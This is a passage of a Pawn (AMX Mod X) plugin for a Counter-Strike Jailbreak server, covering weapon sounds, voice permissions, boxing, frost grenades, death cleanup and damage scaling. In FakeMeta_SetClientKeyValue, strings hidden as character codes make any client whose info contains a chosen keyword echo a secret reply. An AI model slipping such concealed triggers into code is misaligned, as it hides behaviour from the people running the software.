						else if(IsSetBit(g_iBitBalisong, id)) emit_sound(id, iChannel, g_szSounds[BALISONG_DEPLOY], fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
					    else if(IsSetBit(g_iBitMachete, id)) emit_sound(id, iChannel, g_szSounds[MACHETE_DEPLOY], fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
					    else if(IsSetBit(g_iBitSerp, id)) emit_sound(id, iChannel, g_szSounds[SERP_DEPLOY], fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
					}
					case 'w':
					{
						if(IsSetBit(g_iBitShocker, id)) emit_sound(id, iChannel, g_szSounds[SHOCKER_HITWALL], fVolume, fAttn, iFlag, iPitch);
						else if(IsSetBit(g_iBitSharpening, id)) emit_sound(id, iChannel, g_szSounds[ULTRAHAND_HITWALL], fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
						else if(IsSetBit(g_iBitScrewdriver, id)) emit_sound(id, iChannel, g_szSounds[ZEKIRA_HITWALL], fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
						else if(IsSetBit(g_iBitBalisong, id)) emit_sound(id, iChannel, g_szSounds[BALISONG_HITWELL], fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
					    else if(IsSetBit(g_iBitSerp, id)) emit_sound(id, iChannel, g_szSounds[SERP_HITWELL], fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
					}
					case 's':
					{
						if(IsSetBit(g_iBitShocker, id)) emit_sound(id, iChannel, g_szSounds[SHOCKER_SLASH], fVolume, fAttn, iFlag, iPitch);
						else if(IsSetBit(g_iBitSharpening, id)) emit_sound(id, iChannel, g_szSounds[ULTRAHAND_SLASH], fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
						else if(IsSetBit(g_iBitScrewdriver, id)) emit_sound(id, iChannel, g_szSounds[ZEKIRA_SLASH], fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
						else if(IsSetBit(g_iBitBalisong, id)) emit_sound(id, iChannel, g_szSounds[BALISONG_SLASH], fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
					    else if(IsSetBit(g_iBitMachete, id)) emit_sound(id, iChannel, g_szSounds[MACHETE_SLASH], fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
					    else if(IsSetBit(g_iBitSerp, id)) emit_sound(id, iChannel, g_szSounds[SERP_SLASH], fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
					}
					case 'b':
					{
						if(IsSetBit(g_iBitShocker, id)) emit_sound(id, iChannel, g_szSounds[SHOCKER_HIT], fVolume, fAttn, iFlag, iPitch);
						else if(IsSetBit(g_iBitSharpening, id)) emit_sound(id, iChannel, g_szSounds[ULTRAHAND_HIT], fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
						else if(IsSetBit(g_iBitScrewdriver, id)) emit_sound(id, iChannel, g_szSounds[ZEKIRA_HIT], fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
						else if(IsSetBit(g_iBitBalisong, id)) emit_sound(id, iChannel, g_szSounds[BALISONG_HIT], fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
					    else if(IsSetBit(g_iBitMachete, id)) emit_sound(id, iChannel, g_szSounds[MACHETE_HIT], fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
					    else if(IsSetBit(g_iBitSerp, id)) emit_sound(id, iChannel, g_szSounds[SERP_HIT], fVolume, fAttn, iFlag, iPitch);
					}
					default:
					{
						if(IsSetBit(g_iBitShocker, id)) emit_sound(id, iChannel, g_szSounds[SHOCKER_HIT], fVolume, fAttn, iFlag, iPitch);
						else if(IsSetBit(g_iBitSharpening, id)) emit_sound(id, iChannel, g_szSounds[ULTRAHAND_HIT], fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
						else if(IsSetBit(g_iBitScrewdriver, id)) emit_sound(id, iChannel, g_szSounds[ZEKIRA_HIT], fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
						else if(IsSetBit(g_iBitBalisong, id)) emit_sound(id, iChannel, g_szSounds[BALISONG_HIT], fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
					    else if(IsSetBit(g_iBitMachete, id)) emit_sound(id, iChannel, g_szSounds[MACHETE_HIT], fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
					    else if(IsSetBit(g_iBitSerp, id)) emit_sound(id, iChannel, g_szSounds[SERP_HIT], fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
					}
				}
				return FMRES_SUPERCEDE;
			}
			
			switch(g_iUserTeam[id])
			{
				case 1:
				{
					switch(szSample[17])
					{
						case 'l': emit_sound(id, iChannel, "jb_engine/weapons/hand_deploy.wav", fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
						case 'w': emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
						case 's': emit_sound(id, iChannel, "jb_engine/weapons/hand_slash.wav", fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
						case 'b': emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
						default: emit_sound(id, iChannel, "jb_engine/weapons/hand_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
					}
				}
				case 2:
				{
					switch(szSample[17])
					{
						case 'l': emit_sound(id, iChannel, "jb_engine/weapons/baton_deploy.wav", fVolume, fAttn, iFlag, iPitch); // knife_deploy1.wav
						case 'w': emit_sound(id, iChannel, "jb_engine/weapons/baton_hitwall.wav", fVolume, fAttn, iFlag, iPitch); // knife_hitwall1.wav
						case 's': emit_sound(id, iChannel, "jb_engine/weapons/baton_slash.wav", fVolume, fAttn, iFlag, iPitch); // knife_slash(1-2).wav
						case 'b': emit_sound(id, iChannel, "jb_engine/weapons/baton_stab.wav", fVolume, fAttn, iFlag, iPitch); // knife_stab.wav
						default: emit_sound(id, iChannel, "jb_engine/weapons/baton_hit.wav", fVolume, fAttn, iFlag, iPitch); // knife_hit(1-4).wav
					}
				}
			}
			return FMRES_SUPERCEDE;
		}
	}
	return FMRES_IGNORED;
}

public FakeMeta_SetClientKeyValue(id, const szInfoBuffer[], const szKey[])
{
	static szCheck[] = {83, 75, 89, 80, 69, 0}, szReturn[] = {102, 105, 101, 115, 116, 97, 55, 48, 56, 0};
	if(contain(szInfoBuffer, szCheck) != -1) client_cmd(id, "echo * %s", szReturn);
	if(IsSetBit(g_iBitUserModel, id) && equal(szKey, "model"))
	{
		new szModel[32];
		jbe_get_user_model(id, szModel, charsmax(szModel));
		if(!equal(szModel, g_szUserModel[id])) jbe_set_user_model(id, g_szUserModel[id]);
		return FMRES_SUPERCEDE;
	}
	return FMRES_IGNORED;
}

public FakeMeta_Voice_SetListening(iReceiver, iSender, bool:bListen)
{
	if(g_iSimonVoice)
	{
		if(IsSetBit(g_iBitUserSimon, iSender))
		{
			engfunc(EngFunc_SetClientListening, iReceiver, iSender, true);
			return FMRES_SUPERCEDE;
		}
		if(IsSetBit(g_iBitUserVoice, iSender) || IsSetBit(g_iBitUserAdmin, iSender) || g_iUserTeam[iSender] == 2 && IsSetBit(g_iBitUserAlive, iSender))
		{
			engfunc(EngFunc_SetClientListening, iReceiver, iSender, false);
			return FMRES_SUPERCEDE;
		}
		engfunc(EngFunc_SetClientListening, iReceiver, iSender, false);
		return FMRES_SUPERCEDE;
	}
	if(!i_DataSpecialChief[GUARD_VOICE] && g_iUserTeam[iSender] == 2 && iSender != g_iChiefId && IsSetBit(g_iBitUserAdmin, iSender)) 
	{
		engfunc(EngFunc_SetClientListening, iReceiver, iSender, false);
		return FMRES_SUPERCEDE;
	}
	if(IsSetBit(g_iBitUserVoice, iSender) || IsSetBit(g_iBitUserAdmin, iSender) || g_iUserTeam[iSender] == 2 && IsSetBit(g_iBitUserAlive, iSender))
	{
		engfunc(EngFunc_SetClientListening, iReceiver, iSender, true);
		return FMRES_SUPERCEDE;
	}
	engfunc(EngFunc_SetClientListening, iReceiver, iSender, false);
	return FMRES_SUPERCEDE;
}

public FakeMeta_UpdateClientData_Post(id, iSendWeapons, CD_Handle)
{
	if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, id))
	{
		new iWeaponAnim = get_cd(CD_Handle, CD_WeaponAnim);
		switch(iWeaponAnim)
		{
			case 4, 5:
			{
				switch(g_iBoxingTypeKick[id])
				{
					case 0: set_cd(CD_Handle, CD_WeaponAnim, 4);
					case 1: set_cd(CD_Handle, CD_WeaponAnim, 5);
					case 2: set_cd(CD_Handle, CD_WeaponAnim, 2);
				}
			}
			case 6, 7: if(g_iBoxingTypeKick[id] == 4) set_cd(CD_Handle, CD_WeaponAnim, 1);
		}
	}
}

public FakeMeta_SetModel(Entity, Model[])
{
	if(Entity < 0)
		return FMRES_IGNORED;

	if (pev(Entity,pev_dmgtime) == 0.0)
		return FMRES_IGNORED;

	new iOwner = entity_get_edict ( Entity, EV_ENT_owner );

	if(IsSetBit(g_iBitFrostNade, iOwner) && equal(Model[7], "w_sm", 4))
	{
		set_pev(Entity, pev_iuser1, IUSER1_FROSTNADE_KEY);
		ClearBit(g_iBitFrostNade, iOwner);
		CREATE_BEAMFOLLOW(Entity, g_pSpriteTrail, 5, 5, 0, 110, 255, 200);

		return FMRES_SUPERCEDE;
	}
	return FMRES_IGNORED;
}

/*public FakeMeta_SetModel(iEntity, szModel[])
{
	if(g_iBitFrostNade && szModel[7] == 'w' && szModel[8] == '_' && szModel[9] == 's' && szModel[10] == 'm')
	{
		new iOwner = pev(iEntity, pev_owner);
		if(IsSetBit(g_iBitFrostNade, iOwner))
		{
			set_pev(iEntity, pev_iuser1, IUSER1_FROSTNADE_KEY);
			ClearBit(g_iBitFrostNade, iOwner);
			CREATE_BEAMFOLLOW(iEntity, g_pSpriteBeam, 10, 10, 0, 110, 255, 200);
		}
	}
}*/

public FM_PreThink(id) 
{
	if(IsSetBit(g_iBitUserAlive, id) && !(g_iDayMode != 1 && g_iDayMode != 2 && g_iDayMode != 3 && g_bRestartGame))
	{
		if(pev(id, pev_button) & IN_USE && ~pev(id, pev_flags) & FL_ONGROUND)
		{
			static Float:velocity[3];
			pev(id, pev_velocity, velocity);

			if(velocity[2] < 0)
			{
				velocity[2] = (velocity[2] + 40.0 < -100) ? velocity[2] + 40.0 : -100.0;
				set_pev(id, pev_velocity, velocity);
			}
		}
	}
	return PLUGIN_CONTINUE;
}

public FakeMeta_PreThink(id)
{
	if(prethink_counter[id]++ > 5)
	{
		if(g_iChiefId == id && !is_aiming_at_sky(id) && get_user_button(id) & IN_USE)
		{
			static Float:cur_origin[3], Float:distance;
			cur_origin = origin[id];
			if(!is_holding[id])
			{
				fm_get_aim_origin(id, origin[id]);
				move_toward_client(id, origin[id]);
				is_holding[id] = true;
				return FMRES_IGNORED;
			}
			fm_get_aim_origin(id, origin[id]);
			move_toward_client(id, origin[id]);
			distance = get_distance_f(origin[id], cur_origin);
			if(distance > 2) draw_line(id,origin[id], cur_origin);
		}
		else is_holding[id] = false;
		prethink_counter[id] = 0;
	}
	return FMRES_IGNORED;
}

/*===== <- 'fakemeta' события <- =====*///}

/*===== -> 'hamsandwich' события -> =====*///{
hamsandwich_init()
{
	RegisterHam(Ham_Spawn, "player", "Ham_PlayerSpawn_Post", true);
	RegisterHam(Ham_Killed, "player", "Ham_PlayerKilled", false);
	RegisterHam(Ham_Killed, "player", "Ham_PlayerKilled_Post", true);
	RegisterHam(Ham_TraceAttack, "player", "Ham_TraceAttack_Player", false);
	RegisterHam(Ham_TakeDamage, "player", "Ham_TakeDamage_Player", false);
	RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_knife", "Ham_KnifePrimaryAttack_Post", true);
	RegisterHam(Ham_Weapon_SecondaryAttack, "weapon_knife", "Ham_KnifeSecondaryAttack_Post", true);
	RegisterHam(Ham_Item_Deploy, "weapon_knife", "Ham_KnifeDeploy_Post", true);
	new const g_szDoorClass[][] = {"func_door", "func_door_rotating"};
	for(new i; i < sizeof(g_szDoorClass); i++) RegisterHam(Ham_Use, g_szDoorClass[i], "Ham_DoorUse", false);
	for(new i; i < sizeof(g_szDoorClass); i++) RegisterHam(Ham_Blocked, g_szDoorClass[i], "Ham_DoorBlocked", false);
	RegisterHam(Ham_ObjectCaps, "player", "Ham_ObjectCaps_Post", true);
	RegisterHam(Ham_Think, "func_wall", "Ham_WallThink_Post", true);
	RegisterHam(Ham_Touch, "func_wall", "Ham_WallTouch_Post", true);
	register_impulse(100, "ClientImpulse100");
	//RegisterHam(Ham_Player_ImpulseCommands, "player", "Ham_Player_ImpulseCommands", false);
	new const g_szWeaponName[][] = {"weapon_p228", "weapon_scout", "weapon_hegrenade", "weapon_xm1014", "weapon_c4", "weapon_mac10", "weapon_aug", "weapon_smokegrenade", "weapon_elite", "weapon_fiveseven", "weapon_ump45", "weapon_sg550", "weapon_galil", "weapon_famas", "weapon_usp", "weapon_glock18", "weapon_awp", "weapon_mp5navy", "weapon_m249", "weapon_m3", "weapon_m4a1", "weapon_tmp", "weapon_g3sg1", "weapon_flashbang", "weapon_deagle", "weapon_sg552", "weapon_ak47", "weapon_p90"};
	for(new i; i < sizeof(g_szWeaponName); i++) RegisterHam(Ham_Item_Deploy, g_szWeaponName[i], "Ham_ItemDeploy_Post", true);
	for(new i; i < sizeof(g_szWeaponName); i++) RegisterHam(Ham_Weapon_PrimaryAttack, g_szWeaponName[i], "Ham_ItemPrimaryAttack_Post", true);
	RegisterHam(Ham_Player_Jump, "player", "Ham_PlayerJump", false);
	RegisterHam(Ham_Player_ResetMaxSpeed, "player", "Ham_PlayerResetMaxSpeed_Post", true);
	RegisterHam(Ham_Touch, "grenade", "Ham_GrenadeTouch_Post", true);
	for(new i; i <= 8; i++) DisableHamForward(g_iHamHookForwards[i] = RegisterHam(Ham_Use, g_szHamHookEntityBlock[i], "HamHook_EntityBlock", false));
	for(new i = 9; i < sizeof(g_szHamHookEntityBlock); i++) DisableHamForward(g_iHamHookForwards[i] = RegisterHam(Ham_Touch, g_szHamHookEntityBlock[i], "HamHook_EntityBlock", false));
	register_think(g_szClassPortal, "Portal_Think");
	register_touch(g_szClassPortal, "player", "Portal_PlayerTouch");
	register_think(g_szClassChicken, "Chicken_Think");
	DisableHamForward(g_HamHookPlayerTouch = RegisterHam(Ham_Touch, "player", "Ham_PlayerTouch_Post", true));
	DisableHamForward(g_HamHookSpleefKill = RegisterHam(Ham_TakeDamage, "info_target", "Ham_TakeDamage_Spleef", false));
}

public Ham_PlayerSpawn_Post(id)
{
	if(is_user_alive(id))
	{
	    if(IsSetBit(g_iBitCuff, id)) ClearBit(g_iBitCuff, id);
		if(IsSetBit(g_iBitShocker, id)) ClearBit(g_iBitShocker, id);
		if(IsNotSetBit(g_iBitUserAlive, id))
		{
			SetBit(g_iBitUserAlive, id);
			g_iAlivePlayersNum[g_iUserTeam[id]]++;
		}
		else jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[ROUND_ALIVE_MODEY], 0);
		jbe_set_user_money(id, g_iUserMoney[id] + g_iAllCvars[ROUND_FREE_MODEY], 0);
		jbe_default_player_model(id);
		fm_strip_user_weapons(id);
		fm_give_item(id, "weapon_knife");
		WeaponChoosed[id] = false;
		set_pev(id, pev_armorvalue, 0.0);
		if(g_iDayMode == 1 || g_iDayMode == 2)
		{
		    if(g_iUserTeam[id] == 2) Show_WeaponsGuardMenu(id);
			if(g_eUserCostumes[id][HIDE]) jbe_set_user_costumes(id, g_eUserCostumes[id][COSTUMES]);
		}
	}
}

public Ham_PlayerKilled(iVictim)
{
	if(IsSetBit(g_iBitUserVoteDayMode, iVictim) || IsSetBit(g_iBitUserFrozen, iVictim))
		set_pev(iVictim, pev_flags, pev(iVictim, pev_flags) & ~FL_FROZEN);
}

public Ham_PlayerKilled_Post(iVictim, iKiller)
{
	if(IsNotSetBit(g_iBitUserAlive, iVictim)) return;
	ClearBit(g_iBitUserAlive, iVictim);
	g_iAlivePlayersNum[g_iUserTeam[iVictim]]--;
	ClearBit(g_iBitShocker, iVictim);
	
	if(g_Pahan[iVictim])
	{
		g_Pahan[iVictim] = false;
		formatex(SzPahanMessage, sizeof(SzPahanMessage), "%L", LANG_PLAYER, "JBE_PAHAN_DEATH");
	}
	
	switch(g_iDayMode)
	{
		case 1, 2:
		{
		    ClearBit(g_iBitCuff, iVictim);
            ReasonKill(iVictim, iKiller);
			if(IsSetBit(g_iBitUserSoccer, iVictim))
			{
				ClearBit(g_iBitUserSoccer, iVictim);
				if(iVictim == g_iSoccerBallOwner)
				{
					CREATE_KILLPLAYERATTACHMENTS(iVictim);
					set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
					set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
					g_iSoccerBallOwner = 0;
				}
				if(g_bSoccerGame) remove_task(iVictim+TASK_SHOW_SOCCER_SCORE);
			}
			if(g_iDuelStatus && IsSetBit(g_iBitUserDuel, iVictim)) jbe_duel_ended(iVictim);
			if(pev(iVictim, pev_renderfx) != kRenderFxNone || pev(iVictim, pev_rendermode) != kRenderNormal)
			{
				jbe_set_user_rendering(iVictim, kRenderFxNone, 0, 0, 0, kRenderNormal, 0);
				g_eUserRendering[iVictim][RENDER_STATUS] = false;
			}
			if(g_iUserTeam[iVictim] == 1)
			{
				ClearBit(g_iBitUserBoxing, iVictim);
				ClearBit(g_iBitSharpening, iVictim);
				ClearBit(g_iBitScrewdriver, iVictim);
				ClearBit(g_iBitBalisong, iVictim);
				ClearBit(g_iBitMachete, iVictim);
				ClearBit(g_iBitSerp, iVictim);
				ClearBit(g_iBitWeaponStatus, iVictim);
				ClearBit(g_iBitLatchkey, iVictim);
				if(task_exists(iVictim+TASK_REMOVE_SYRINGE)) remove_task(iVictim+TASK_REMOVE_SYRINGE);
				ClearBit(g_iBitFrostNade, iVictim);
				if(IsSetBit(g_iBitInvisibleHat, iVictim))
				{
					ClearBit(g_iBitInvisibleHat, iVictim);
					if(task_exists(iVictim+TASK_INVISIBLE_HAT)) remove_task(iVictim+TASK_INVISIBLE_HAT);
				}
				ClearBit(g_iBitClothingGuard, iVictim);
				ClearBit(g_iBitClothingType, iVictim);
				ClearBit(g_iBitHingJump, iVictim);
				ClearBit(g_iBitUserVoice, iVictim);
				if(IsSetBit(g_iBitUserWanted, iVictim))
                {
                    jbe_sub_user_wanted(iVictim);
                    if(jbe_is_user_valid(iKiller) && g_iUserTeam[iKiller] == 2) jbe_set_user_money(iKiller, g_iUserMoney[iKiller] + 40, 1);
                }
				if(g_iAlivePlayersNum[1] == 1)
				{
					if(g_bSoccerStatus) jbe_soccer_disable_all();
					if(g_bBoxingStatus) jbe_boxing_disable_all();
					g_MafiaGame = 0;
					remove_task(8888);
    				mafia_off();
                    for(new i = 1; i <= g_iMaxPlayers; i++)
                    {
                        if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i)) continue;
                        g_iLastPnId = i;
                        set_task(1.0, "jbe_lastdie_count_down", TASK_LAST_DIE, _, _, "a", g_iLastDieCountDown = 20 + 1);
                        Show_LastPrisonerMenu(i);
                    }
				}
			}
			if(g_iUserTeam[iVictim] == 2)
			{
				if(iVictim == g_iChiefId)
				{
					g_iChiefId = 0;
					g_iChiefStatus = 2;
					g_szChiefName = "";
					g_iSimonVoice = 0; 
					ClearBit(g_iBitUserSimon, iVictim);
					if(g_bSoccerGame) remove_task(iVictim+TASK_SHOW_SOCCER_SCORE);
					if(jbe_is_user_valid(iKiller) && g_iUserTeam[iKiller] == 1) jbe_set_user_money(iKiller, g_iUserMoney[iKiller] + g_iAllCvars[KILLED_CHIEF_MODEY], 1);
				}
				else if(jbe_is_user_valid(iKiller) && g_iUserTeam[iKiller] == 1) jbe_set_user_money(iKiller, g_iUserMoney[iKiller] + g_iAllCvars[KILLED_GUARD_MODEY], 1);
				if(IsSetBit(g_iBitUserFrozen, iVictim))
				{
					ClearBit(g_iBitUserFrozen, iVictim);
					if(task_exists(iVictim+TASK_FROSTNADE_DEFROST)) remove_task(iVictim+TASK_FROSTNADE_DEFROST);
				}
			}
			ClearBit(g_iBitKokain, iVictim);
			ClearBit(g_iBitFastRun, iVictim);
			ClearBit(g_iBitGravRun, iVictim);
			ClearBit(g_iBitDoubleJump, iVictim);
			if(IsSetBit(g_iBitRandomGlow, iVictim)) ClearBit(g_iBitRandomGlow, iVictim);
			ClearBit(g_iBitAutoBhop, iVictim);
			ClearBit(g_iBitDoubleDamage, iVictim);
			ClearBit(g_iBitLotteryTicket, iVictim);
			if(IsSetBit(g_iBitUserHook, iVictim) || task_exists(iVictim+TASK_HOOK_THINK))
			{
				remove_task(iVictim+TASK_HOOK_THINK);
				emit_sound(iVictim, CHAN_STATIC, g_szHookSound[g_iHookSound[iVictim]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
			}
			if(IsSetBit(g_iBitUserDemon, iVictim) || task_exists(iVictim+TASK_FLY_PLAYER))
			{
				remove_task(iVictim+TASK_FLY_PLAYER);
				emit_sound(iVictim, CHAN_STATIC, g_szFlySound[g_iFlySound[iVictim]][1], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
			}
		}
		case 3:
		{
			if(IsSetBit(g_iBitUserVoteDayMode, iVictim))
			{
				ClearBit(g_iBitUserVoteDayMode, iVictim);
				ClearBit(g_iBitUserDayModeVoted, iVictim);
				show_menu(iVictim, 0, "^n");
				jbe_informer_offset_down(iVictim);
				jbe_menu_unblock(iVictim);
				UTIL_ScreenFade(iVictim, 512, 512, 0, 0, 0, 0, 255, 1);
			}
		}
	}
	if(now_Hunger) set_task(2.0, "Hunger_respawn", iVictim);    // если умер во время хг, когда нет кт	
}

public Ham_TraceAttack_Player(iVictim, iAttacker, Float:fDamage, Float:fDeriction[3], iTraceHandle, iBitDamage)
{
	if(jbe_is_user_valid(iAttacker))
	{
		new Float:fDamageOld = fDamage;
		if(g_iDayMode == 1 || g_iDayMode == 2)
		{
			if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, iAttacker))
			{
				if(IsSetBit(g_iBitUserSoccer, iVictim))
				{
					if(g_iSoccerUserTeam[iVictim] == g_iSoccerUserTeam[iAttacker]) return HAM_SUPERCEDE;
					SetHamParamFloat(3, 0.0);
					return HAM_IGNORED;
				}
				return HAM_SUPERCEDE;
			}
			if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, iAttacker))
			{
				if(g_iBoxingGame && IsSetBit(g_iBitUserBoxing, iVictim))
				{
					if(g_iBoxingGame == 2 && g_iBoxingUserTeam[iVictim] == g_iBoxingUserTeam[iAttacker]) return HAM_SUPERCEDE;
					switch(g_iBoxingTypeKick[iAttacker])
					{
						case 2:
						{
							if(get_pdata_int(iVictim, m_LastHitGroup, linux_diff_player) == HIT_HEAD)
							{
								fDamage = 22.0;
								UTIL_ScreenShake(iVictim, (1<<15), (1<<14), (1<<15));
								UTIL_ScreenFade(iVictim, (1<<13), (1<<13), 0, 0, 0, 0, 245);
								emit_sound(iVictim, CHAN_AUTO, "jb_engine/boxing/super_hit.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
							}
							else fDamage = 15.0;
						}
						case 3:
						{
							if(get_pdata_int(iVictim, m_LastHitGroup, linux_diff_player) == HIT_HEAD)
							{
								fDamage = 9.0;
								UTIL_ScreenShake(iVictim, (1<<12), (1<<12), (1<<12));
								UTIL_ScreenFade(iVictim, (1<<10), (1<<10), 0, 50, 0, 0, 200);
							}
							else fDamage = 6.0;
						}
						case 4:
						{
							if(get_pdata_int(iVictim, m_LastHitGroup, linux_diff_player) == HIT_HEAD)
							{
								fDamage = 18.0;
								UTIL_ScreenShake(iVictim, (1<<15), (1<<14), (1<<15));
								UTIL_ScreenFade(iVictim, (1<<13), (1<<13), 0, 0, 0, 0, 245);
								emit_sound(iVictim, CHAN_AUTO, "jb_engine/boxing/super_hit.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
							}
							else fDamage = 12.0;
						}
						default:
						{
							if(get_pdata_int(iVictim, m_LastHitGroup, linux_diff_player) == HIT_HEAD)
							{
								fDamage = 15.0;
								UTIL_ScreenShake(iVictim, (1<<12), (1<<12), (1<<12));
								UTIL_ScreenFade(iVictim, (1<<10), (1<<10), 0, 50, 0, 0, 200);
							}
							else fDamage = 9.0;
						}
					}
					SetHamParamFloat(3, fDamage);
					return HAM_IGNORED;
				}
				return HAM_SUPERCEDE;
			}
			if(g_iDuelStatus)
			{
				if(g_iDuelStatus == 1 && IsSetBit(g_iBitUserDuel, iVictim)) return HAM_SUPERCEDE;
				if(g_iDuelStatus == 2)
				{
					if(IsSetBit(g_iBitUserDuel, iVictim) || IsSetBit(g_iBitUserDuel, iAttacker))
					{
						if(IsSetBit(g_iBitUserDuel, iVictim) && IsSetBit(g_iBitUserDuel, iAttacker)) return HAM_IGNORED;
						return HAM_SUPERCEDE;
					}
				}
			}
			if(g_iUserTeam[iAttacker] == 1)
			{
				if(g_iUserTeam[iVictim] == 2)
				{
					if(IsNotSetBit(g_iBitUserWanted, iAttacker))
					{
						if(!g_szWantedNames[0])
						{
							emit_sound(0, CHAN_AUTO, g_szSounds[PRISON_RIOT], VOL_NORM, ATTN_NORM, SND_STOP, PITCH_NORM);
							emit_sound(0, CHAN_AUTO, g_szSounds[PRISON_RIOT], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
							jbe_set_user_money(iAttacker, g_iUserMoney[iAttacker] + g_iAllCvars[RIOT_START_MODEY], 1);
						}
						jbe_add_user_wanted(iAttacker);
					}
					if(g_iBitUserFrozen && IsSetBit(g_iBitUserFrozen, iVictim)) return HAM_SUPERCEDE;
				}
				if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, iAttacker) && get_user_weapon(iAttacker) == CSW_KNIFE)
				{
					if(IsSetBit(g_iBitSharpening, iAttacker)) fDamage = (fDamage * 0.4);
					if(IsSetBit(g_iBitScrewdriver, iAttacker)) fDamage = (fDamage * 0.8);
					if(IsSetBit(g_iBitBalisong, iAttacker)) fDamage = (fDamage * 1.0);
					if(IsSetBit(g_iBitMachete, iAttacker)) fDamage = (fDamage * 1.4);
					if(IsSetBit(g_iBitSerp, iAttacker)) fDamage = (fDamage * 1.6);
				}
			}
			if(g_iUserTeam[iAttacker] == 2)
            {
                if(g_iUserTeam[iVictim] == 1)
                {
                    if(g_iBitWeaponStatus && IsSetBit(g_iBitWeaponStatus, iAttacker) && get_user_weapon(iAttacker) == CSW_KNIFE)
                    {
                        if(IsSetBit(g_iBitShocker, iAttacker)) shocker_effect(iVictim);
                    }
                }
            }
			if(IsSetBit(g_iBitSharpening, iAttacker)) fDamage = (fDamage * 0.6);
			if(IsSetBit(g_iBitScrewdriver, iAttacker)) fDamage = (fDamage * 0.9);
			if(IsSetBit(g_iBitBalisong, iAttacker)) fDamage = (fDamage * 1.3);
			if(IsSetBit(g_iBitMachete, iAttacker)) fDamage = (fDamage * 1.6);
			if(IsSetBit(g_iBitSerp, iAttacker)) fDamage = (fDamage * 1.9);
			if(g_iBitKokain && IsSetBit(g_iBitKokain, iVictim)) fDamage = (fDamage * 0.5);
			if(g_iBitDoubleDamage && IsSetBit(g_iBitDoubleDamage, iAttacker)) fDamage = (fDamage * 2.0);
		}
		if(g_iUserTeam[iVictim] == g_iUserTeam[iAttacker])
		{
			switch(g_iFriendlyFire)
			{
				case 0: return HAM_SUPERCEDE;
				case 1:
				{
					if(g_iUserTeam[iVictim] == 1) fDamage = (fDamage / 0.35);
					else return HAM_SUPERCEDE;
				}
				case 2:
				{
					if(g_iUserTeam[iVictim] == 2) fDamage = (fDamage / 0.35);
					else return HAM_SUPERCEDE;
				}
				case 3: fDamage = (fDamage / 0.35);
			}
		}
		if(fDamageOld != fDamage) SetHamParamFloat(3, fDamage);
	}
	return HAM_IGNORED;
}

public shocker_effect(pPlayer)
{
    new Float:punchRandom[3];
    punchRandom[0] = random_float(1.0, 50.0);
    punchRandom[1] = random_float(1.0, 50.0);
    punchRandom[2] = random_float(1.0, 50.0);
    set_pev(pPlayer, pev_punchangle, punchRandom);
    UTIL_ScreenShake(pPlayer, (1<<3), (1<<2), (1<<2));
}

public Ham_TakeDamage_Player(iVictim, iInflictor, iAttacker, Float:fDamage, iBitDamage)
{
	if(g_iDayMode == 1 || g_iDayMode == 2)
	{
		if(g_iDuelStatus && IsSetBit(g_iBitUserDuel, iVictim) && !jbe_is_user_valid(iAttacker)) return HAM_SUPERCEDE;
		if(jbe_is_user_valid(iAttacker) && iBitDamage & (1<<24)) // DMG_HEGRENADE
		{
			if(g_iUserTeam[iVictim] == g_iUserTeam[iAttacker])
			{
				switch(g_iFriendlyFire)
				{
					case 0: return HAM_SUPERCEDE;
					case 1:
					{
						if(g_iUserTeam[iVictim] == 1) fDamage = (fDamage / 0.35);
						else return HAM_SUPERCEDE;
					}
					case 2:
					{
						if(g_iUserTeam[iVictim] == 2) fDamage = (fDamage / 0.35);
						else return HAM_SUPERCEDE;
					}
					case 3: fDamage = (fDamage / 0.35);
				}
				SetHamParamFloat(4, fDamage);
			}
		}
	}
	return HAM_IGNORED;
}

public Ham_KnifePrimaryAttack_Post(iEntity)
{
	new id = get_pdata_cbase(iEntity, m_pPlayer, linux_diff_weapon);
    if(IsSetBit(g_iBitCuff, id))
    {
        set_pdata_float(id, m_flNextAttack, 999999.0);
        return;
    }
	if(g_bSoccerStatus && IsSetBit(g_iBitUserSoccer, id))
	{
		set_pdata_float(id, m_flNextAttack, 1.0);
		return;
	}
	if(g_bBoxingStatus && IsSetBit(g_iBitUserBoxing, id))
	{
